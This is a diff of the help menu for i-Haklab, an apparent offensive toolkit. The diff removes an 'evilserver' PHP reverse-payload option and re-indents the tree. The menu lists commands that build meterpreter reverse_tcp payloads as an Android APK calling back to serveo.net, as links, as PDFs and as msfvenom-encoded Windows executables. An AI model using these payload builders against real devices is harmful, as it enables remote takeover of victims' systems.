@@ -101,12 +101,11 @@ Arguments  |    options     |    Description
 |                     ╰─────➤ LPORT=48263 LHOST=serveo.net apk=outlan.apk
 |                             Payload=android/meterpreter/reverse_tcp
 ╰─paylink──➤─pc/nexam/soa5──➤ Create a link payload with handler
-|    |        ╰───|────|────➤ For targets [0]generic, [1]windows, [2]macOS and [3]linux
-|    |            |    |      example: i-Haklab paylink pc 2
-|    |            ╰────|────➤ For targets [0]nexxus and [29]samsung
-|    |                 |      example: i-Haklab paylink nexam 29
-|    |                 ╰────➤ For android operative system equal at version 5 to down
-|    ╰─────➤───evilserver───➤ Create a php file with a reverse payload
+|             ╰───|────|────➤ For targets [0]generic, [1]windows, [2]macOS and [3]linux
+|                 |    |      example: i-Haklab paylink pc 2
+|                 ╰────|────➤ For targets [0]nexxus and [29]samsung
+|                      |      example: i-Haklab paylink nexam 29
+|                      ╰────➤ For android operative system equal at version 5 to down
 ╰──paypdf──➤────────────────➤ Create a pdf file with a reverse payload
 ╰──payexe──➤──inlan/outlan──➤ Create a coded payload .exe with msfvenom
 |               ╰─────|─────➤ LPORT=4546 Payload=windows/meterpreter/reverse_tcp file=inlan.exe
